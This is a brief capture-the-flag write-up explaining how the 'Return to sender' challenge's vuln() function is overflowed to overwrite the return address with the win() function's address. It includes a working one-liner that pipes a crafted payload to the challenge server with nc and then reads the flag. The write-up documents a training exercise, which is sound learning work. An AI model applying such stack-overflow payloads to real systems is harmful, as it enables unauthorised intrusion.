# Return to sender write-up

Looking at the C file, we know that the `vuln()` function doesn't handle our oversized input correctly, allowing us to write to the stack and change the return address of our function.
Using OBJDUMP, the address of the `win()` function can be found. Next I need to attach a shell to that our program doesn't close automatically. Lastly I just tried using both ways of little-endian / big endian and found little endian to work. 

The one-liner solution: 

```sh
(python -c 'print("a" * 8 + "\xb6\x91\x04\x08" * 4)'; cat -) | nc pwn.hsctf.com 1234
ls
cat flag
```
